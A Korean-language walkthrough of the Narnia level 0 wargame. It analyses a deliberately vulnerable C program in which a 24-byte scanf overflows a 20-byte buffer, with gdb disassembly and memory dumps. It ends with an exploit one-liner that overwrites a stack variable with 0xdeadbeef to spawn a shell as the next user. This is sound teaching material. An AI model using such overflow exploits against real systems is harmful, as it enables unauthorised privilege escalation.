## 1. 문제 확인
- ID : narnia0
- Target : /narnia/narnia0
- Flag : /etc/narnia_pass/narnia1
```
narnia0@gibson:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: abcde
buf: abcde
val: 0x41414141
WAY OFF!!!!
narnia0@gibson:/narnia$ 
```

<br/><br/>
## 2. 취약점 분석
### 2.1 Source Code
- 사용자 입력 값을 통해 val의 값인 0x41414141 을 0xdeadbeef 로 강제 변경하면 쉘(/bin/sh)이 실행됨
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
### 2.2 Code 분석
#### 2.2.1 main()
- gdb로 열어서 메인함수의 disassemble 코드를 확인해보면 [ebp-0x8] 위치에 0x41414141 값이 저장됨
```
	0x080491cd <+7>:     mov    DWORD PTR [ebp-0x8],0x41414141
```
- [ebp-0x1c] 위치에 사용자 입력값을 저장함
```
	0x080491ee <+40>:    lea    eax,[ebp-0x1c]
	0x080491f1 <+43>:    push   eax
	0x080491f2 <+44>:    push   0x804a051
	0x080491f7 <+49>:    call   0x80490a0 <__isoc99_scanf@plt>
```
- ebp-0x8 위치에 있는 값과 0xdeadbeef 값을 비교하여 일치하면 uid를 재설정하여 system함수(쉘)를 실행함
```
	0x08049220 <+90>:    cmp    DWORD PTR [ebp-0x8],0xdeadbeef
   	0x08049227 <+97>:    jne    0x804924e <main+136>
   	0x08049229 <+99>:    call   0x8049050 <geteuid@plt>
   	0x0804922e <+104>:   mov    ebx,eax
   	0x08049230 <+106>:   call   0x8049050 <geteuid@plt>
   	0x08049235 <+111>:   push   ebx
   	0x08049236 <+112>:   push   eax
   	0x08049237 <+113>:   call   0x8049090 <setreuid@plt>
   	0x0804923c <+118>:   add    esp,0x8
   	0x0804923f <+121>:   push   0x804a06c
   	0x08049244 <+126>:   call   0x8049070 <system@plt>
```
- gdb로 프로그램을 실행하여 사용자 입력 후 [ebp-0x1c] 메모리 값을 확인해보면 20byte 이후 0x41414141 값이 위치함
```
	Correct val's value from 0x41414141 -> 0xdeadbeef!
	Here is your chance: abcde

	Breakpoint 2, 0x080491ff in main ()
	(gdb) x/20wx $ebp-0x1c
	0xffffd39c:     0x64636261      0x00000065      0x00000000      0x00000000
	0xffffd3ac:     0x00000000      0x41414141      0xf7fade34      0x00000000
	0xffffd3bc:     0xf7da1cb9      0x00000001      0xffffd474      0xffffd47c
	0xffffd3cc:     0xffffd3e0      0xf7fade34      0x080490dd      0x00000001
	0xffffd3dc:     0xffffd474      0xf7fade34      0xffffd47c      0xf7ffcb60
	(gdb)
```
- buf 사이즈가 20byte지만 최대 24byte 까지 입력받을 수 있으며, 24byte를 입력하면 0x41414141 데이터를 덮어쓸 수 있음
```
	Correct val's value from 0x41414141 -> 0xdeadbeef!
	Here is your chance: AAAAAAAAAAAAAAAAAAAABBBB

	Breakpoint 2, 0x080491ff in main ()
	(gdb) x/20wx $ebp-0x1c
	0xffffd39c:     0x41414141      0x41414141      0x41414141      0x41414141
	0xffffd3ac:     0x41414141      0x42424242      0xf7fade00      0x00000000
	0xffffd3bc:     0xf7da1cb9      0x00000001      0xffffd474      0xffffd47c
	0xffffd3cc:     0xffffd3e0      0xf7fade34      0x080490dd      0x00000001
	0xffffd3dc:     0xffffd474      0xf7fade34      0xffffd47c      0xf7ffcb60
	(gdb)
```

<br/><br/>
## 3. Exploit
- 20byte 문자와 0xdeadbeef(4byte) 입력 데이터를 만들고, 프로그램 실행 인자로 전달하면 쉘 획득
(※ cat 을 명령 셸에 두 번째 입력으로 전달하면 명령 셸이 열린 상태로 유지됨)
```
	narnia0@gibson:/narnia$ (echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde';cat;)|./narnia0
	Correct val's value from 0x41414141 -> 0xdeadbeef!
	Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ▒
	val: 0xdeadbeef
	id
	uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
```
